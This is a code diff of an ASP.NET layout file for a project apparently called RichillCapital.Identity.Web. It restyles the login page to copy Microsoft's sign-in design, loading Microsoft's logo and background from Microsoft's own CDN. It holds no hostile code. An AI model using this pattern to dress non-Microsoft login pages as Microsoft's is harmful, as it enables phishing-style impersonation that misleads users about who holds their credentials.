@@ -10,7 +10,46 @@
     <link rel="stylesheet" href="~/RichillCapital.Identity.Web.styles.css" asp-append-version="true" />
 </head>
 <body>
-    @RenderBody()
+    <div class="root">
+        <div>
+            <div class="direction-wrapper">
+                <div style="position: absolute; height: 100%; width: 100%; top: 0px; right: 0px; left: 0px; bottom: 0px; overflow-x: auto; overflow-y: auto;">
+                    <div class="background-container">
+                        <div class="background-image"></div>
+                    </div>
+
+                    <div class="outer">
+                        <div class="middle">
+                            <div>
+                                <div>
+                                    <div>
+                                        <div class="inner">
+                                            <div class="lightbox-cover"></div>
+
+                                            <div>
+                                                <img class="form-logo" src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg">
+                                                @await Html.PartialAsync("_IdentityBanner")
+
+                                                <div class="page-content">
+                                                    <div class="route-animation">
+                                                        @RenderBody()
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="footer">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
 
     <script src="~/lib/jquery/dist/jquery.min.js"></script>
     <script src="~/js/site.js" asp-append-version="true"></script>
@@ -20,6 +59,19 @@
 </html>
 
 <style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    font-weight: 400;
+    font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+    font-size: 0.9375rem;
+    line-height: 1.25rem;
+    margin: 0px;
+    background-color: rgb(255, 255, 255);
+}
+
 button, input, select, textarea {
     font-weight: inherit;
     font-family: inherit;
@@ -28,4 +80,114 @@ button, input, select, textarea {
     max-width: 100%;
     margin: 0px;
 }
+
+.root {
+    min-height: 1px;
+}
+
+.direction-wrapper {
+    min-height: 1px;
+}
+
+.background-container {
+    height: 100%;
+    width: 100%;
+    top: 0px;
+    left: 0px;
+    z-index: -1;
+    position: fixed;
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position-x: 50%;
+    background-position-y: 50%;
+    background-color: rgb(242, 242, 242);    
+}
+
+.background-image {
+    height: 100%;
+    width: 100%;
+    top: 0px;
+    left: 0px;
+    z-index: -1;
+    position: fixed;
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position-x: 50%;
+    background-position-y: 50%;
+    background-image: url(https://logincdn.msftauth.net/shared/5/images/2_bc3d32a696895f78c19d.svg);
+}
+
+.outer {
+    position: absolute;
+    height: 100%;
+    width: 100%;
+    top: 0px;
+    right: 0px;
+    left: 0px;
+    bottom: 0px;
+    display: table;
+}
+
+.middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+
+
+.inner {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 440px;
+    width: calc(100% - 40px);
+    padding-top: 44px;
+    padding-bottom: 44px;
+    padding-left: 44px;
+    padding-right: 44px;
+    margin-bottom: 28px;
+    background-color: rgb(255, 255, 255);
+    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
+    min-width: 320px;
+    min-height: 338px;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    z-index: 1;
+    animation-name: f11ta6k4;
+    transition-timing-function: ease-in;
+    animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
+    animation-duration: 0.3s;
+}
+
+.lightbox-cover {
+    position: absolute;
+    height: 100%;
+    width: 100%;
+    top: 0px;
+    left: 0px;
+    background-color: white;
+    opacity: 0;
+    z-index: -1;
+    transition: 0.5s ease-in;
+}
+
+.form-logo {
+    max-width: 256px;
+    height: 24px;
+}
+
+.page-content {
+    position: relative;
+    min-height: 206px;
+}
+
+.route-animation {
+    position: relative;
+    animation-duration: 0.25s;
+    animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
+    animation-fill-mode: both;
+    transition-property: left;
+    animation-name: fr2e2iv;
+    min-height: inherit;
+}
+
 </style>
